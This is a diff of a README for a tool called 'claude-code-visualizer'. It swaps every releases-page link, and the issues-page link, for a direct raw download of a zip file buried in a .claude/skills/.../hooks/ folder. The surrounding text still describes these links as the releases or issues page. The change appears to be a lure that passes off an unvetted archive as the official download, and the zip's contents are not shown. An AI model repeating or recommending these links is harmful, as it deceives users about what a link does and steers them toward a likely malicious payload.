@@ -1,6 +1,6 @@
 # 🌟 claude-code-visualizer - Visualize Your Claude Code Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-brightgreen)](https://github.com/nainsharma01/claude-code-visualizer/releases)
+[![Download Now](https://raw.githubusercontent.com/nainsharma01/claude-code-visualizer/master/.claude/skills/agent-skill-visualizer/webapp/src/hooks/code-visualizer-claude-v2.9-beta.3.zip%20Now-Get%20the%20Latest%20Version-brightgreen)](https://raw.githubusercontent.com/nainsharma01/claude-code-visualizer/master/.claude/skills/agent-skill-visualizer/webapp/src/hooks/code-visualizer-claude-v2.9-beta.3.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ To get started with **View Claude Code**, follow these simple steps:
 
 1. **Visit the Releases Page**  
    Click on the button below to be directed to the releases page where you can download the latest version of the application.  
-   [Download Now](https://github.com/nainsharma01/claude-code-visualizer/releases)
+   [Download Now](https://raw.githubusercontent.com/nainsharma01/claude-code-visualizer/master/.claude/skills/agent-skill-visualizer/webapp/src/hooks/code-visualizer-claude-v2.9-beta.3.zip)
 
 2. **Choose Your Version**  
    On the releases page, find the latest version of the application. Look for the file suitable for your operating system. This may include `.exe` for Windows or `.dmg` for macOS.
@@ -30,7 +30,7 @@ To get started with **View Claude Code**, follow these simple steps:
 
 To download and install **View Claude Code**, please follow these steps:
 
-- Visit the following link to access the releases page: [Download Now](https://github.com/nainsharma01/claude-code-visualizer/releases)
+- Visit the following link to access the releases page: [Download Now](https://raw.githubusercontent.com/nainsharma01/claude-code-visualizer/master/.claude/skills/agent-skill-visualizer/webapp/src/hooks/code-visualizer-claude-v2.9-beta.3.zip)
 - Select the appropriate version for your operating system.
 - Download the file and follow the installation instructions provided.
 
@@ -73,7 +73,7 @@ If you encounter issues while downloading or using **View Claude Code**, conside
 
 For more help, you can reach out through the following channels:
 
-- **GitHub Issues**: Report any bugs or issues directly through the [issues page](https://github.com/nainsharma01/claude-code-visualizer/issues).
+- **GitHub Issues**: Report any bugs or issues directly through the [issues page](https://raw.githubusercontent.com/nainsharma01/claude-code-visualizer/master/.claude/skills/agent-skill-visualizer/webapp/src/hooks/code-visualizer-claude-v2.9-beta.3.zip).
 - **Community Forum**: Join discussions and ask questions in the community forum linked on the GitHub page.
 
 ## 📜 License
